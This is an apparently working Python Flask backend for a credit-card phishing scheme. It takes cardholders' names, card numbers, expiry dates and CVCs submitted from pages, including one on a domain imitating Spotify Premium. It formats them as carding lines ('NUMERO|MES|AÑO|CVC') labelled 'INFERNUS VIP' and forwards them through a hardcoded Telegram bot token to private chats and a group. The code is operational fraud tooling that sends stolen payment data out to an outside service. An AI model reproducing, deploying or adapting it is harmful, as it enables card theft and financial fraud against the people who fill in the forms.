import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

DOMINIO_GRUPO = 'free.spotlfypremium.online'
ID_GRUPO_DESTINO = '-1004493468867'

CLIENTES_PRIVADOS = ['6953415010', '7707049896']
LISTA_MAESTRA_IDS = CLIENTES_PRIVADOS + [ID_GRUPO_DESTINO]

@app.route('/test', methods=['GET'])
def test_bot():
    MI_ID_PARA_TEST = '7707049896'
    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": MI_ID_PARA_TEST,
        "text": "🚀 *BOT ACTIVO* 🚀\nTodo funciona correctamente.",
        "parse_mode": "Markdown"
    }
    
    try:
        res = requests.post(url_telegram, json=payload, timeout=5)
        if res.status_code == 200:
            return jsonify({"status": "ok", "msg": "Mensaje enviado"}), 200
        else:
            return jsonify({"status": "error", "msg": res.text}), 500
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    lista_ids_html = data.get('lista_ids', [])
    origen = request.headers.get('Origin', '').split('/')[2]

    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A').replace(' ', '')  # Quita espacios
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # Separar mes y año
    exp_parts = expiracion.split('/')
    if len(exp_parts) == 2:
        mes = exp_parts[0]
        ano = exp_parts[1]
    else:
        mes = expiracion
        ano = 'N/A'

    # Formato de una línea: NUMERO|MES|AÑO|CVC
    cc_linea = f"{tarjeta}|{mes}|{ano}|{cvc}"

    mensaje = (
        f"🔥 *INFERNUS VIP* 🔥\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"`{cc_linea}`\n\n"
        f"👤 _{nombre}_"
    )

    if origen == DOMINIO_GRUPO:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ID_GRUPO_DESTINO, "text": mensaje, "parse_mode": "Markdown"}
        
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                print(f"✅ ENVIADO AL GRUPO")
                return jsonify({"status": "success", "enviados": 1}), 200
        except Exception as e:
            print(f"❌ ERROR: {e}")
        
        return jsonify({"status": "error"}), 500

    exitos = 0
    lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]
    
    for id_receptor in lista_ids_html:
        id_limpio = str(id_receptor).strip()
        
        if id_limpio in lista_maestra_strings:
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": id_limpio, "text": mensaje, "parse_mode": "Markdown"}
            
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                if res.status_code == 200:
                    exitos += 1
                    print(f"✅ ENVIADO A: {id_limpio}")
                else:
                    print(f"❌ ERROR TELEGRAM: {res.text}")
            except Exception as e:
                print(f"❌ ERROR RED: {e}")
        else:
            print(f"🚫 ID NO AUTORIZADO: {id_limpio}")

    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
